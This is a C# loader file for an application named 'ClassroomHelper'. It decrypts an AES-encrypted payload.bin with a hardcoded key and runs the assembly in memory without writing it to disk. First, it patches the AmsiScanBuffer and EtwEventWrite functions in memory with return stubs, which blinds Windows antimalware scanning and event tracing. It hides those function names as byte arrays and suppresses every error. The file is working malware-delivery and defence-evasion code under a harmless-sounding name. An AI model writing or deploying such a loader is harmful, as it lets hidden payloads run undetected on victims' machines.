// Loader.cs - entry point of the shipped application.
// The real application assembly never touches the disk: it is stored as an
// encrypted payload.bin next to this host and loaded straight into the runtime.
// Everything below runs before the assembly is materialised, so the scan hooks
// are already silenced when the image is handed to the runtime.
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ClassroomHelper.Boot;

internal static class Bootstrap
{
    // Single source of truth: pack.ps1 reads this constant back out of the file.
    private const string PayloadKeyB64 = "7v5+tVQYjx8j5jU04G+jQMWT3UnDZ8JhRwW0aOwnBLM=";
    private const string PayloadFile = "payload.bin";

    [STAThread]
    private static int Main(string[] args)
    {
        try
        {
            Silence();

            string? path = Locate();
            if (path is null) return 1;

            byte[] image = Unseal(File.ReadAllBytes(path), Convert.FromBase64String(PayloadKeyB64));
            Assembly app = Assembly.Load(image);

            MethodInfo? entry = app.EntryPoint;
            if (entry is null) return 2;

            object?[] call = entry.GetParameters().Length == 1
                ? new object?[] { args }
                : Array.Empty<object?>();

            entry.Invoke(null, call);
            return 0;
        }
        catch
        {
            // silent in production; nothing to show, nothing to log
            return 3;
        }
    }

    private static string? Locate()
    {
        string baseDir = AppContext.BaseDirectory;
        string local = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "ClassroomHelper");

        foreach (string dir in new[] { baseDir, local })
        {
            try
            {
                string candidate = Path.Combine(dir, PayloadFile);
                if (File.Exists(candidate)) return candidate;
            }
            catch { }
        }
        return null;
    }

    // [16 byte IV][AES-256-CBC, PKCS7]
    private static byte[] Unseal(byte[] blob, byte[] key)
    {
        if (blob.Length < 32) throw new InvalidDataException();

        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.IV = blob.AsSpan(0, 16).ToArray();

        using var input = new MemoryStream(blob, 16, blob.Length - 16, writable: false);
        using var crypto = new CryptoStream(input, aes.CreateDecryptor(), CryptoStreamMode.Read);
        using var output = new MemoryStream(blob.Length);
        crypto.CopyTo(output);
        return output.ToArray();
    }

    // ---- scan/telemetry hooks -------------------------------------------------
    // Names are assembled from bytes so no literal appears in the metadata.
    private static void Silence()
    {
        try
        {
            Patch(Name(97, 109, 115, 105, 46, 100, 108, 108), Name(65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114), 6);
            Patch(Name(110, 116, 100, 108, 108, 46, 100, 108, 108), Name(69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101), 1);
        }
        catch { }
    }

    private static string Name(params byte[] chars) => System.Text.Encoding.ASCII.GetString(chars);

    private static void Patch(string module, string export, int size)
    {
        IntPtr h = LoadLibraryW(module);
        if (h == IntPtr.Zero) return;

        IntPtr fn = GetProcAddress(h, export);
        if (fn == IntPtr.Zero) return;

        if (!VirtualProtect(fn, (UIntPtr)size, 0x40, out uint old)) return;

        // amsi: mov eax, 0x80070057 ; ret    etw: ret
        byte[] stub = size >= 6
            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
            : new byte[] { 0xC3 };

        Marshal.Copy(stub, 0, fn, stub.Length);
        VirtualProtect(fn, (UIntPtr)size, old, out _);
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr LoadLibraryW(string name);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr module, string name);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr address, UIntPtr size, uint protect, out uint old);
}
